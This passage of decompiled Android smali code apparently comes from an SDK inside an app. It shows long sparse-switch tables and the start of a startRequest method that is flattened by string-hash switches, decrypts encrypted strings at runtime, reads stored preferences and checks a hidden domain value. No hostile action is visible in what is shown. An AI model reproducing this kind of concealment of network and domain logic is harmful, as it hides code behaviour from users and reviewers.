        0x6119def8 -> :sswitch_2a
    .end sparse-switch

    :sswitch_data_d
    .sparse-switch
        -0x7309a763 -> :sswitch_83
        -0x48a27773 -> :sswitch_7a
        -0x1b2919c7 -> :sswitch_2b
        0x69dae6fd -> :sswitch_7b
    .end sparse-switch

    :sswitch_data_e
    .sparse-switch
        -0x7ce54684 -> :sswitch_77
        -0x5cc488ec -> :sswitch_2c
        0x71a8275 -> :sswitch_78
        0xd42a73a -> :sswitch_79
    .end sparse-switch

    :sswitch_data_f
    .sparse-switch
        -0x6a1ab951 -> :sswitch_30
        -0x555d41e2 -> :sswitch_2d
        -0x20e5efb9 -> :sswitch_2f
        0x37f8aa7e -> :sswitch_31
    .end sparse-switch

    :sswitch_data_10
    .sparse-switch
        -0x3fc0360d -> :sswitch_34
        -0x8df0a19 -> :sswitch_38
        0x1ab2b207 -> :sswitch_3c
        0x4b25b5d7 -> :sswitch_74
    .end sparse-switch

    :sswitch_data_11
    .sparse-switch
        -0x12e83d4e -> :sswitch_35
        0x4e12e25b -> :sswitch_42
        0x5812e694 -> :sswitch_3e
        0x66a9883d -> :sswitch_43
    .end sparse-switch

    :sswitch_data_12
    .sparse-switch
        -0x5828119c -> :sswitch_4b
        -0x4683e7e8 -> :sswitch_74
        0x1d381dd -> :sswitch_4f
        0x161aa176 -> :sswitch_36
    .end sparse-switch

    :sswitch_data_13
    .sparse-switch
        -0x1ecaee8f -> :sswitch_3b
        0x459e9175 -> :sswitch_39
        0x4f0a2fd1 -> :sswitch_3a
        0x55351890 -> :sswitch_37
    .end sparse-switch

    :sswitch_data_14
    .sparse-switch
        -0x787f90d -> :sswitch_3d
        -0x4f22b5e -> :sswitch_3f
        0x34e0275 -> :sswitch_40
        0xe632d18 -> :sswitch_41
    .end sparse-switch

    :sswitch_data_15
    .sparse-switch
        -0x41c594e0 -> :sswitch_49
        -0x320f0de6 -> :sswitch_56
        0x51cc623 -> :sswitch_35
        0xaebfb55 -> :sswitch_44
    .end sparse-switch

    :sswitch_data_16
    .sparse-switch
        -0x7420193a -> :sswitch_46
        -0x595b9af1 -> :sswitch_48
        0x3d603bb5 -> :sswitch_47
        0x4e8baabb -> :sswitch_45
    .end sparse-switch

    :sswitch_data_17
    .sparse-switch
        -0x6efe27ae -> :sswitch_4e
        -0x5d25ad4e -> :sswitch_4c
        0x4992029b -> :sswitch_4a
        0x712a5774 -> :sswitch_4d
    .end sparse-switch

    :sswitch_data_18
    .sparse-switch
        -0x246cb447 -> :sswitch_55
        0xb965e55 -> :sswitch_74
        0x3bbfcabf -> :sswitch_56
        0x4235c5a8 -> :sswitch_50
    .end sparse-switch

    :sswitch_data_19
    .sparse-switch
        -0x2e3dd54e -> :sswitch_51
        -0x25579e22 -> :sswitch_54
        -0x36684b2 -> :sswitch_53
        0x7f653cdf -> :sswitch_52
    .end sparse-switch

    :sswitch_data_1a
    .sparse-switch
        -0x6379404a -> :sswitch_57
        -0x28cc64a4 -> :sswitch_5a
        -0x142dad9 -> :sswitch_76
        0xa8367c1 -> :sswitch_5e
    .end sparse-switch

    :sswitch_data_1b
    .sparse-switch
        -0x4e28dd26 -> :sswitch_58
        -0x2a4107ea -> :sswitch_64
        -0x6c6a906 -> :sswitch_75
        0x7c7e18fb -> :sswitch_60
    .end sparse-switch

    :sswitch_data_1c
    .sparse-switch
        -0x5828442e -> :sswitch_59
        -0x2b893c48 -> :sswitch_5d
        0x32a26f6b -> :sswitch_5b
        0x5fd8147a -> :sswitch_5c
    .end sparse-switch

    :sswitch_data_1d
    .sparse-switch
        -0x41a5b02c -> :sswitch_5f
        -0x38ccadd4 -> :sswitch_63
        -0x325b24c5 -> :sswitch_62
        -0x21ba2059 -> :sswitch_61
    .end sparse-switch

    :sswitch_data_1e
    .sparse-switch
        -0x78db94fe -> :sswitch_65
        -0x5c30e77d -> :sswitch_67
        -0x3045e512 -> :sswitch_73
        -0x2b767704 -> :sswitch_6b
    .end sparse-switch

    :sswitch_data_1f
    .sparse-switch
        -0x52bafb22 -> :sswitch_68
        0xfec617e -> :sswitch_6a
        0x2863c6af -> :sswitch_66
        0x2f6204a7 -> :sswitch_69
    .end sparse-switch

    :sswitch_data_20
    .sparse-switch
        0x4ddcadae -> :sswitch_6c
        0x5e298223 -> :sswitch_74
        0x6744ebac -> :sswitch_71
        0x7594def5 -> :sswitch_72
    .end sparse-switch

    :sswitch_data_21
    .sparse-switch
        -0x5ddb8db8 -> :sswitch_70
        -0x81fd3f3 -> :sswitch_6d
        0x26139b1d -> :sswitch_6e
        0x689ea9d3 -> :sswitch_6f
    .end sparse-switch

    :sswitch_data_22
    .sparse-switch
        -0x6d195b65 -> :sswitch_82
        -0x4dca25e3 -> :sswitch_81
        -0x2140fa6f -> :sswitch_83
        0xf220dc4 -> :sswitch_7c
    .end sparse-switch

    :sswitch_data_23
    .sparse-switch
        -0x6a84a76c -> :sswitch_7f
        -0x39986303 -> :sswitch_80
        0x53b427f3 -> :sswitch_7e
        0x79bf1bdd -> :sswitch_7d
    .end sparse-switch

    :sswitch_data_24
    .sparse-switch
        -0x4f5ce0f1 -> :sswitch_86
        -0xcaa68df -> :sswitch_8b
        0x257cbcb3 -> :sswitch_8a
        0x544a4489 -> :sswitch_83
    .end sparse-switch

    :sswitch_data_25
    .sparse-switch
        -0x491a4427 -> :sswitch_9b
        -0x32bae521 -> :sswitch_95
        0x54910ad7 -> :sswitch_99
        0x66f69968 -> :sswitch_84
    .end sparse-switch

    :sswitch_data_26
    .sparse-switch
        -0x7aa7a385 -> :sswitch_88
        -0x630b2006 -> :sswitch_85
        -0x55d3b353 -> :sswitch_87
        -0x27107ae5 -> :sswitch_89
    .end sparse-switch

    :sswitch_data_27
    .sparse-switch
        -0x499e2330 -> :sswitch_91
        0x14de23af -> :sswitch_93
        0x44467931 -> :sswitch_8c
        0x57c3f02c -> :sswitch_92
    .end sparse-switch

    :sswitch_data_28
    .sparse-switch
        -0x43f2d3e6 -> :sswitch_8f
        -0x323af922 -> :sswitch_90
        0x2c9152a0 -> :sswitch_8d
        0x66a1f5aa -> :sswitch_8e
    .end sparse-switch

    :sswitch_data_29
    .sparse-switch
        -0x69f5a02a -> :sswitch_97
        0xa5967e -> :sswitch_98
        0x2e4c592c -> :sswitch_94
        0x778bcf22 -> :sswitch_96
    .end sparse-switch

    :sswitch_data_2a
    .sparse-switch
        -0x6262fef0 -> :sswitch_a1
        0x1940815c -> :sswitch_9d
        0x24f32623 -> :sswitch_a2
        0x27b55da1 -> :sswitch_9a
    .end sparse-switch

    :sswitch_data_2b
    .sparse-switch
        -0x7d2f46cc -> :sswitch_a0
        0x19f77651 -> :sswitch_9f
        0x6331064e -> :sswitch_9e
        0x7f212b53 -> :sswitch_9c
    .end sparse-switch

    :sswitch_data_2c
    .sparse-switch
        -0x4b94ef8d -> :sswitch_a9
        -0x4a1a406d -> :sswitch_a8
        -0x26688e5c -> :sswitch_a3
        0x7d13df21 -> :sswitch_b1
    .end sparse-switch

    :sswitch_data_2d
    .sparse-switch
        -0x6f739af8 -> :sswitch_a5
        0x673977bc -> :sswitch_a6
        0x69357189 -> :sswitch_a4
        0x7cc4b8da -> :sswitch_a7
    .end sparse-switch

    :sswitch_data_2e
    .sparse-switch
        -0x3f393d46 -> :sswitch_b0
        0x9c69839 -> :sswitch_ac
        0x3f54234b -> :sswitch_aa
        0x60958baa -> :sswitch_b1
    .end sparse-switch

    :sswitch_data_2f
    .sparse-switch
        -0x64a8ad1e -> :sswitch_ab
        -0x49cb7157 -> :sswitch_ad
        0xcc8cede -> :sswitch_af
        0x4b33cd49 -> :sswitch_ae
    .end sparse-switch
.end method

.method public static startRequest(Landroid/content/Context;Z)V
    .locals 26

    const/16 v16, 0x0

    const/4 v7, 0x0

    const/16 v23, 0x0

    const/16 v22, 0x0

    const/4 v12, 0x0

    const/4 v3, 0x0

    const/4 v11, 0x0

    const/4 v10, 0x0

    const/4 v8, 0x0

    const/4 v9, 0x0

    const/4 v6, 0x0

    const/4 v4, 0x0

    const/4 v5, 0x0

    const/4 v2, 0x0

    const-string v1, "\u06e1\u06db\u06e7\u06df\u06e1\u06e4\u06e1\u06e2\u06e7\u06df\u06da\u06d9\u06dc\u06da\u06e2\u06e6\u06d9\u06d7\u06d6\u06dc\u06d8\u06e6\u06d9\u06d9\u06d6\u06e4\u06e1\u06d8\u06df\u06ec\u06e8\u06d8"

    move v13, v2

    move v14, v4

    move v15, v5

    move-object/from16 v17, v6

    move-object/from16 v18, v9

    move-object/from16 v19, v10

    move-object/from16 v20, v11

    move-object/from16 v21, v12

    :goto_0
    invoke-virtual {v1}, Ljava/lang/String;->hashCode()I

    move-result v2

    const/16 v4, 0x117

    xor-int/2addr v2, v4

    xor-int/lit8 v2, v2, 0x3d

    const/16 v4, 0x2c9

    const v5, 0x188675e9

    xor-int/2addr v2, v4

    xor-int/2addr v2, v5

    sparse-switch v2, :sswitch_data_0

    goto :goto_0

    :sswitch_0
    const-string v1, "\u06e5\u06e0\u06e1\u06d8\u06d7\u06e0\u06dc\u06d8\u06d9\u06e1\u06e1\u06db\u06df\u06dc\u06e5\u06df\u06dc\u06dc\u06e7\u06dc\u06d8\u06e7\u06d9\u06d9\u06dc\u06ec\u06d8\u06d8\u06e8\u06d6\u06df\u06db\u06dc\u06e6\u06d9\u06e6\u06e8\u06d8\u06e2\u06e1\u06e4\u06d7\u06e5\u06eb\u06ec\u06db\u06e1"

    goto :goto_0

    :sswitch_1
    const-string v1, "\u06e4\u06eb\u06dc\u06d8\u06d7\u06db\u06e2\u06d6\u06ec\u06d7\u06db\u06da\u06db\u06db\u06eb\u06e4\u06df\u06e8\u06d8\u06e2\u06df\u06dc\u06d8\u06e2\u06e1\u06e5\u06e8\u06e0\u06d6\u06ec\u06e0\u06da\u06d8\u06e7\u06e6\u06d8\u06e5\u06d9\u06d8\u06db\u06e7\u06e2\u06e4\u06e7\u06d6\u06d8\u06ec\u06d6\u06d6\u06d8\u06dc\u06e4\u06da\u06e6\u06d9\u06e8\u06d7\u06eb\u06d9"

    goto :goto_0

    :sswitch_2
    const/16 v16, 0x1

    const-string v1, "\u06d9\u06d6\u06dc\u06d8\u06e6\u06d8\u06e1\u06e5\u06eb\u06e5\u06d8\u06d6\u06d8\u06e5\u06d8\u06d7\u06e6\u06e7\u06dc\u06e0\u06dc\u06d8\u06df\u06e4\u06e1\u06e5\u06e0\u06ec\u06e0\u06d6\u06e7\u06dc\u06d6\u06eb\u06e2\u06e8\u06d8\u06d6\u06d7\u06d6\u06d8\u06e7\u06d7\u06e4\u06e0\u06d6\u06ec\u06da\u06df\u06e6\u06d8\u06d8\u06d8\u06e2\u06db\u06ec\u06e5\u06e1\u06e5\u06e5\u06d8"

    goto :goto_0

    :sswitch_3
    const v2, 0xcdb809c

    const-string v1, "\u06e8\u06e4\u06ec\u06e5\u06d6\u06e5\u06e8\u06d8\u06d8\u06e0\u06e0\u06e8\u06e4\u06eb\u06eb\u06dc\u06e1\u06d7\u06ec\u06e2\u06d8\u06d8\u06e2\u06da\u06ec\u06e4\u06dc\u06d6\u06db\u06ec\u06e5\u06d8\u06df\u06e4\u06e1\u06d8\u06d8\u06dc\u06ec\u06e7\u06e8\u06eb\u06d7\u06dc\u06eb\u06e0\u06e6\u06db\u06e2\u06da\u06eb\u06da\u06db\u06e7\u06e1\u06eb\u06d6"

    :goto_1
    invoke-virtual {v1}, Ljava/lang/String;->hashCode()I

    move-result v4

    xor-int/2addr v4, v2

    sparse-switch v4, :sswitch_data_1

    goto :goto_1

    :sswitch_4
    const-string v1, "\u06d6\u06dc\u06d8\u06e8\u06df\u06d6\u06e1\u06e6\u06e5\u06db\u06d9\u06e0\u06df\u06d9\u06d9\u06ec\u06ec\u06da\u06da\u06e5\u06d6\u06d8\u06d6\u06e2\u06d8\u06d8\u06dc\u06e4\u06e5\u06d8\u06e4\u06e0\u06d8\u06e5\u06d7\u06e6\u06e1\u06d9\u06d8\u06d8\u06d7\u06dc\u06e1\u06e1\u06e5\u06eb"

    goto :goto_1

    :sswitch_5
    const-string v1, "\u06e6\u06d8\u06e4\u06d8\u06eb\u06e8\u06df\u06d8\u06e5\u06d8\u06df\u06e7\u06df\u06df\u06df\u06d6\u06e0\u06d7\u06d8\u06d6\u06e4\u06e0\u06e0\u06e1\u06e1\u06da\u06e7\u06d6\u06e1\u06e5\u06d6\u06df\u06d8\u06d8\u06ec\u06d7\u06e8\u06e1\u06ec\u06d8\u06db\u06e0\u06e1\u06ec\u06dc\u06e7\u06d8\u06eb\u06db\u06d8"

    goto :goto_1

    :sswitch_6
    const v4, 0x5eb77631

    const-string v1, "\u06e7\u06d6\u06dc\u06d8\u06d9\u06e6\u06d8\u06eb\u06e7\u06e6\u06d8\u06e8\u06d6\u06e0\u06e1\u06dc\u06e8\u06d8\u06da\u06df\u06e5\u06d8\u06ec\u06ec\u06e6\u06e7\u06e7\u06df\u06da\u06ec\u06d6\u06d8\u06ec\u06e7\u06e1\u06d9\u06e4\u06d6\u06e2\u06e4\u06e4\u06da\u06e6\u06e4\u06e0\u06e8\u06db\u06e2\u06e1\u06ec\u06e4\u06db\u06d8\u06d8\u06e0\u06d7\u06d9\u06ec\u06d8\u06d8"

    :goto_2
    invoke-virtual {v1}, Ljava/lang/String;->hashCode()I

    move-result v5

    xor-int/2addr v5, v4

    sparse-switch v5, :sswitch_data_2

    goto :goto_2

    :sswitch_7
    const-string v1, "\u06e4\u06ec\u06da\u06da\u06e1\u06db\u06e5\u06e2\u06dc\u06d8\u06e7\u06df\u06e8\u06d8\u06e4\u06d9\u06eb\u06e4\u06db\u06e4\u06d6\u06e0\u06e4\u06d8\u06e7\u06e7\u06d7\u06e2\u06d9\u06e1\u06d6\u06e8\u06e8\u06e6\u06da\u06e1\u06e0\u06ec\u06d9\u06ec\u06e4\u06d7\u06d9\u06e8\u06dc\u06e7\u06d8"

    goto :goto_2

    :cond_0
    const-string v1, "\u06e8\u06d9\u06e1\u06e1\u06ec\u06e1\u06d8\u06d7\u06e8\u06d8\u06e2\u06e0\u06e8\u06d8\u06e6\u06e6\u06da\u06eb\u06d9\u06d8\u06e4\u06eb\u06e2\u06d8\u06da\u06db\u06e5\u06e0\u06da\u06e4\u06e7\u06e8\u06d8\u06dc\u06d6\u06e1\u06d8\u06d6\u06e4\u06e7"

    goto :goto_2

    :sswitch_8
    sget-boolean v1, LCu7y/sdk/e5;->a:Z

    if-nez v1, :cond_0

    const-string v1, "\u06da\u06da\u06e7\u06dc\u06e4\u06df\u06e7\u06eb\u06e6\u06d8\u06e4\u06da\u06d8\u06d9\u06df\u06ec\u06ec\u06d8\u06e5\u06df\u06ec\u06e2\u06e4\u06d9\u06dc\u06d8\u06e2\u06df\u06e6\u06e6\u06df\u06df\u06ec\u06eb\u06dc\u06e8\u06e6\u06e1\u06e8\u06e6\u06d8\u06e4\u06e5\u06da\u06d9\u06e6\u06e5\u06dc\u06eb\u06ec\u06eb\u06e5\u06d6\u06da\u06d6\u06d8"

    goto :goto_2

    :sswitch_9
    const-string v1, "\u06d8\u06ec\u06df\u06e1\u06d9\u06e8\u06e7\u06df\u06d9\u06eb\u06e0\u06d6\u06dc\u06e6\u06e4\u06e1\u06d6\u06d8\u06e7\u06e7\u06d8\u06ec\u06eb\u06e2\u06e1\u06e2\u06e1\u06d8\u06e6\u06da\u06e1\u06d8\u06da\u06e6\u06d9\u06d8\u06eb\u06d6\u06d8"

    goto :goto_1

    :sswitch_a
    const-string v1, "\u06e5\u06da\u06dc\u06d8\u06d7\u06dc\u06e1\u06d8\u06dc\u06df\u06dc\u06d9\u06da\u06ec\u06da\u06e7\u06e6\u06df\u06ec\u06e5\u06d9\u06da\u06ec\u06d9\u06e8\u06e7\u06e5\u06eb\u06e7\u06d6\u06dc"

    goto :goto_0

    :sswitch_b
    const v2, -0x1fa9c769

    const-string v1, "\u06df\u06df\u06e1\u06e5\u06dc\u06d6\u06e0\u06d7\u06e2\u06ec\u06e0\u06e7\u06e4\u06d8\u06d8\u06d9\u06ec\u06e5\u06d8\u06e5\u06d6\u06dc\u06d8\u06d6\u06ec\u06e7\u06d9\u06e7\u06dc\u06d8\u06e0\u06e5\u06e7\u06e8\u06eb\u06d6\u06d8\u06d9\u06e0\u06d6\u06d8\u06e0\u06d8\u06dc\u06dc\u06e5\u06e6\u06d8\u06db\u06e0\u06d9\u06d8\u06e2\u06dc"

    :goto_3
    invoke-virtual {v1}, Ljava/lang/String;->hashCode()I

    move-result v4

    xor-int/2addr v4, v2

    sparse-switch v4, :sswitch_data_3

    goto :goto_3

    :sswitch_c
    const-string v1, "\u06da\u06db\u06d8\u06d7\u06e8\u06dc\u06d8\u06d6\u06da\u06e0\u06e6\u06d8\u06d8\u06d8\u06e4\u06d8\u06da\u06e6\u06da\u06e6\u06d8\u06eb\u06ec\u06e8\u06d8\u06d9\u06e4\u06e2\u06e6\u06e1\u06e5\u06e4\u06d6\u06e7\u06e2\u06e4\u06d7\u06e7\u06e8\u06d9\u06dc\u06e8\u06e0\u06d7\u06e5\u06e1\u06df\u06eb\u06db\u06e4\u06da"

    goto :goto_3

    :sswitch_d
    const-string v1, "\u06e7\u06e5\u06e5\u06d8\u06d7\u06e5\u06d6\u06e7\u06d7\u06e1\u06d6\u06d8\u06d9\u06da\u06da\u06d6\u06d8\u06eb\u06df\u06d8\u06d8\u06e1\u06d7\u06d9\u06d6\u06d6\u06db\u06d6\u06d6\u06e8\u06d8\u06db\u06e4\u06e6\u06e6\u06d7\u06e4\u06e5\u06ec\u06ec\u06e7\u06e0\u06e6\u06d8\u06e8\u06da\u06e7\u06e5\u06e6\u06e8\u06d8\u06df\u06e5\u06d8\u06d8"

    goto :goto_3

    :sswitch_e
    const v4, -0x2c970e25    # -1.0004901E12f

    const-string v1, "\u06d8\u06dc\u06e0\u06db\u06e0\u06e1\u06e0\u06da\u06d9\u06d6\u06db\u06e0\u06e0\u06d6\u06d6\u06d8\u06e7\u06eb\u06d8\u06d8\u06da\u06d7\u06d9\u06d9\u06d8\u06e8\u06d8\u06d7\u06d6\u06d8\u06db\u06d9\u06e7"

    :goto_4
    invoke-virtual {v1}, Ljava/lang/String;->hashCode()I

    move-result v5

    xor-int/2addr v5, v4

    sparse-switch v5, :sswitch_data_4

    goto :goto_4

    :sswitch_f
    const-string v1, "\u06d7\u06e0\u06d6\u06d8\u06db\u06dc\u06d8\u06e8\u06e4\u06e1\u06d8\u06d8\u06d7\u06df\u06d7\u06da\u06e2\u06e1\u06db\u06dc\u06d8\u06eb\u06db\u06df\u06d9\u06d7\u06eb\u06db\u06e2\u06df\u06eb\u06df\u06e0\u06d6\u06df\u06dc\u06d8\u06e2\u06e1\u06e5"

    goto :goto_3

    :cond_1
    const-string v1, "\u06e8\u06ec\u06e5\u06e8\u06eb\u06e4\u06dc\u06e6\u06e1\u06d8\u06d8\u06d8\u06eb\u06dc\u06d6\u06d8\u06e2\u06d7\u06e6\u06d8\u06ec\u06e7\u06df\u06d9\u06d7\u06e8\u06df\u06d8\u06d9\u06e8\u06e7\u06e7\u06e8\u06db\u06dc\u06d8\u06da\u06e6\u06e2\u06eb\u06e0\u06d8\u06d6\u06e6\u06da"

    goto :goto_4

    :sswitch_10
    sget-object v1, LCu7y/sdk/e5;->b:Lorg/json/JSONObject;

    if-eqz v1, :cond_1

    const-string v1, "\u06e8\u06e0\u06d9\u06e7\u06e5\u06d8\u06eb\u06e6\u06e6\u06e4\u06e4\u06e1\u06d8\u06d6\u06d8\u06d8\u06d8\u06da\u06ec\u06e1\u06d8\u06e1\u06db\u06e5\u06d8\u06d9\u06e0\u06eb\u06e0\u06ec\u06e6\u06d6\u06e2\u06d8\u06db\u06e4\u06d6\u06e1\u06d6\u06d7"

    goto :goto_4

    :sswitch_11
    const-string v1, "\u06e1\u06e5\u06d6\u06dc\u06e4\u06dc\u06e8\u06e5\u06e6\u06ec\u06e0\u06e6\u06e8\u06e1\u06e6\u06d8\u06dc\u06dc\u06e7\u06d8\u06db\u06e7\u06db\u06e4\u06d9\u06dc\u06d8\u06d8\u06d6\u06d8\u06dc\u06db\u06df\u06e5\u06e8\u06db\u06e8\u06d6\u06e5\u06d8"

    goto :goto_4

    :sswitch_12
    const-string v1, "\u06eb\u06e7\u06d8\u06db\u06e7\u06d7\u06dc\u06e7\u06d9\u06ec\u06d8\u06dc\u06dc\u06db\u06d8\u06db\u06e5\u06e8\u06e4\u06d8\u06dc\u06d8\u06dc\u06d7\u06e8\u06e5\u06e1\u06e5\u06e2\u06e7\u06dc\u06d8\u06e7\u06d9\u06e7\u06e8\u06d9\u06d8\u06dc\u06e8\u06d6\u06e5\u06db\u06da\u06ec\u06d7\u06e7\u06db\u06e2"

    goto/16 :goto_0

    :sswitch_13
    const v2, 0x395cbc1b

    const-string v1, "\u06dc\u06ec\u06e5\u06d9\u06d8\u06e8\u06e0\u06d9\u06e1\u06e1\u06d8\u06e5\u06d6\u06d6\u06e1\u06db\u06d6\u06e1\u06d8\u06df\u06e0\u06d6\u06d8\u06da\u06df\u06e6\u06d8\u06dc\u06d8\u06e4\u06e6\u06e6\u06e7\u06dc\u06d9\u06dc\u06d8\u06ec\u06d9\u06d7"

    :goto_5
    invoke-virtual {v1}, Ljava/lang/String;->hashCode()I

    move-result v4

    xor-int/2addr v4, v2

    sparse-switch v4, :sswitch_data_5

    goto :goto_5

    :sswitch_14
    const-string v1, "\u06e7\u06e0\u06e1\u06d8\u06e7\u06ec\u06e8\u06d8\u06d7\u06d8\u06e6\u06db\u06e5\u06da\u06ec\u06e5\u06d6\u06d9\u06d8\u06e4\u06e4\u06e7\u06da\u06e8\u06da\u06e1\u06e7\u06d7\u06d8\u06d8\u06d9\u06dc\u06da\u06e0\u06e7\u06e5\u06e2\u06da\u06e2\u06ec\u06d6\u06e4\u06e6\u06eb\u06e7\u06d9\u06d7\u06e1\u06ec\u06dc\u06eb"

    goto :goto_5

    :sswitch_15
    const-string v1, "\u06d6\u06e7\u06e6\u06ec\u06d8\u06d6\u06db\u06df\u06e0\u06e5\u06e8\u06e7\u06d8\u06e1\u06e4\u06e5\u06d8\u06ec\u06d9\u06e1\u06d9\u06e8\u06e5\u06d8\u06e2\u06d9\u06db\u06e0\u06d8\u06d8\u06d8\u06e4\u06ec\u06e1\u06d8\u06eb\u06eb\u06e1\u06d8\u06d7\u06e4\u06d6\u06e2\u06e7\u06dc\u06d8\u06e4\u06e4\u06e6\u06d8\u06e7\u06d7\u06e5\u06d8\u06e5\u06d6\u06dc\u06d8\u06d7\u06da\u06d7\u06da\u06e1\u06d7"

    goto :goto_5

    :sswitch_16
    const v4, 0x70bed440

    const-string v1, "\u06d6\u06d7\u06e7\u06dc\u06d9\u06d8\u06d8\u06ec\u06e5\u06e7\u06d8\u06e6\u06e1\u06e8\u06d8\u06ec\u06e7\u06d8\u06d8\u06e8\u06d8\u06e6\u06d8\u06da\u06e8\u06df\u06df\u06e5\u06e7\u06e8\u06e7\u06eb\u06da\u06dc\u06e6\u06d8\u06d7\u06d7\u06d8\u06e2\u06e0\u06e7"

    :goto_6
    invoke-virtual {v1}, Ljava/lang/String;->hashCode()I

    move-result v5

    xor-int/2addr v5, v4

    sparse-switch v5, :sswitch_data_6

    goto :goto_6

    :sswitch_17
    const-string v1, "\u06e8\u06d8\u06e1\u06d8\u06e1\u06e2\u06e7\u06dc\u06d8\u06ec\u06db\u06e0\u06e7\u06d9\u06da\u06eb\u06d8\u06eb\u06db\u06d9\u06e5\u06da\u06df\u06d6\u06d8\u06db\u06e2\u06e4\u06e7\u06e0\u06e4\u06e4\u06df\u06dc\u06d8\u06e2\u06e5\u06e5\u06d8\u06d7\u06df\u06db\u06d7\u06e6\u06e8\u06e4\u06e6\u06e5\u06d8\u06e4\u06ec\u06e5\u06d8"

    goto :goto_6

    :cond_2
    const-string v1, "\u06ec\u06d6\u06e7\u06db\u06d8\u06e8\u06d8\u06e5\u06d8\u06da\u06eb\u06d9\u06e0\u06db\u06d8\u06e5\u06e4\u06d7\u06db\u06d6\u06d8\u06e6\u06dc\u06db\u06e6\u06d6\u06d7\u06e5\u06db\u06d9\u06e8\u06e2\u06e7\u06ec\u06e7\u06eb\u06da\u06da\u06d9\u06e6\u06d8\u06eb\u06d6\u06d6\u06d8\u06e1\u06e0\u06e1\u06e2\u06dc\u06d6\u06dc\u06e4\u06ec\u06d7\u06e2\u06e8"

    goto :goto_6

    :sswitch_18
    if-nez p1, :cond_2

    const-string v1, "\u06e8\u06d9\u06e2\u06d6\u06dc\u06db\u06d9\u06e1\u06e5\u06d9\u06e7\u06e8\u06df\u06e5\u06ec\u06e7\u06d7\u06e1\u06e1\u06da\u06d9\u06d9\u06e5\u06e0\u06e0\u06e0\u06d8\u06d7\u06e2\u06da"

    goto :goto_6

    :sswitch_19
    const-string v1, "\u06eb\u06e8\u06d9\u06e0\u06e4\u06d8\u06d8\u06ec\u06e7\u06e6\u06d8\u06e1\u06df\u06d7\u06db\u06da\u06dc\u06e2\u06d8\u06d6\u06d8\u06e1\u06e2\u06dc\u06d8\u06d7\u06e1\u06e1\u06db\u06d8\u06da\u06df\u06e4\u06e5\u06d8\u06e6\u06e7\u06db\u06ec\u06d9\u06e8"

    goto :goto_5

    :sswitch_1a
    const-string v1, "\u06d7\u06df\u06db\u06ec\u06e2\u06db\u06ec\u06e6\u06e6\u06d8\u06d9\u06dc\u06e1\u06e5\u06d9\u06e5\u06d8\u06da\u06dc\u06e6\u06d8\u06df\u06dc\u06e1\u06dc\u06d9\u06dc\u06e6\u06dc\u06e4\u06ec\u06eb\u06d6"

    goto/16 :goto_0

    :sswitch_1b
    const/4 v1, 0x1

    sput-boolean v1, LCu7y/sdk/e5;->a:Z

    const-string v1, "\u06da\u06ec\u06d8\u06d8\u06e7\u06e4\u06e1\u06d8\u06da\u06e8\u06d8\u06dc\u06d9\u06e2\u06dc\u06e4\u06e5\u06d8\u06d8\u06d7\u06d6\u06db\u06d7\u06d6\u06d6\u06d8\u06d8\u06e8\u06e4\u06dc\u06d8\u06e8\u06e8\u06df\u06e8\u06d7\u06e2\u06db\u06df\u06db\u06df\u06e0\u06e7\u06e6\u06df\u06e1\u06df\u06dc\u06d6\u06d8\u06e1\u06da\u06e4\u06d6\u06e1\u06dc\u06d8\u06e8\u06e1\u06e0"

    goto/16 :goto_0

    :sswitch_1c
    sget-object v1, LCu7y/sdk/e5;->d:Ljava/lang/String;

    const/4 v2, 0x0

    move-object/from16 v0, p0

    invoke-virtual {v0, v1, v2}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v7

    const-string v1, "\u06e4\u06e2\u06e6\u06d8\u06db\u06e2\u06e1\u06eb\u06df\u06db\u06d7\u06dc\u06e1\u06dc\u06dc\u06da\u06e5\u06e5\u06d8\u06ec\u06d7\u06e1\u06e1\u06d6\u06e1\u06d8\u06e0\u06e8\u06da\u06d6\u06e7\u06dc\u06d8\u06e1\u06e4\u06e6\u06d8\u06e6\u06e7\u06e5\u06eb\u06e8\u06d8\u06dc\u06db\u06d8\u06d8"

    goto/16 :goto_0

    :sswitch_1d
    const-string v1, "ry4MVlBhLr7tei0/EFdZ0PEOZTZ6DXWZoj07VUZo\n"

    const-string v2, "SpKMs/fqyDc=\n"

    invoke-static {v1, v2}, LCu7y/sdk/y7;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    const-string v2, "djPvpQ==\n"

    const-string v4, "H12Jyiibfo8=\n"

    invoke-static {v2, v4}, LCu7y/sdk/y7;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-static {v1, v2}, LCu7y/sdk/x7;->logToFloatingWindow(Ljava/lang/String;Ljava/lang/String;)V

    const-string v1, "\u06d6\u06e8\u06e6\u06d6\u06e1\u06d6\u06d8\u06eb\u06d8\u06eb\u06ec\u06df\u06d9\u06e4\u06ec\u06da\u06e4\u06db\u06d8\u06d8\u06e8\u06d9\u06e8\u06d8\u06d8\u06d6\u06e2\u06d7\u06e0\u06dc\u06d8\u06da\u06d9\u06e1\u06df\u06e8\u06e5\u06d9\u06e2\u06eb\u06db\u06eb\u06d8\u06e7\u06d7\u06e1\u06d8\u06d8\u06e4\u06e0\u06ec\u06db\u06e0"

    goto/16 :goto_0

    :sswitch_1e
    sget-object v1, Lcom/zyyad/gamf/kXEoVYTwnQIy;->DOMAINS:Ljava/lang/String;

    const-string v2, "/6Mr8UQAK/H3ozI=\n"

    const-string v4, "pIBvvglBYr8=\n"

    invoke-static {v2, v4}, LCu7y/sdk/y7;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    const-string v1, "\u06e1\u06e8\u06d9\u06e5\u06e6\u06e8\u06e0\u06dc\u06d8\u06dc\u06df\u06d6\u06d8\u06db\u06ec\u06e1\u06e8\u06e6\u06d6\u06e7\u06e7\u06e4\u06df\u06ec\u06e7\u06e6\u06e4\u06d8\u06d8\u06e1\u06df\u06d8\u06d8\u06e1\u06db\u06e6\u06e7\u06d8\u06e1\u06eb\u06e6\u06db\u06d8\u06e8\u06d8\u06df\u06e5\u06e4\u06d8\u06e7\u06e6\u06d8"

    move/from16 v23, v2

    goto/16 :goto_0

    :sswitch_1f
    const v2, 0x894954f

